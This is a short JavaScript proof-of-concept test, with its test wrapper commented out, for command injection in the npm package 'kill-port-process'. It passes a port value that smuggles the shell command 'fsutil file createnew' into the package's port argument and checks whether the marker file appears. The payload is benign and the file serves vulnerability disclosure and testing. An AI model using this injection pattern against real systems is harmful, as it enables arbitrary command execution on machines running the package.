// test("Command Injection in kill-port-process", () => {
//   expect.assertions(2);
  const killPortProcess = require("kill-port-process");
  const fs = require("fs");
  const path = "./kill-port-process";
  const PORT = "& fsutil file createnew kill-port-process 0 &";
  try {
    if (fs.existsSync(path)) {
      fs.unlinkSync(path);
//       console.log("File removed:", path);
    }
  } catch (err) {
    console.error(err);
  }
  file_exist = fs.existsSync(path);
console.log("{ " + file_exist + ", " + false + " }");
  console.log(killPortProcess(PORT)
    .then(() => {
//       console.log("here!");
      file_exist = fs.existsSync(path);
console.log("{ " + file_exist + ", " + true + " }");
    })
    .catch((err) => {})
    .finally(() => {
//       console.log("here!!!!");
      if (fs.existsSync(path)) {
        fs.unlinkSync(path);
//         console.log("File removed!:", path);
      }
    }));
// });
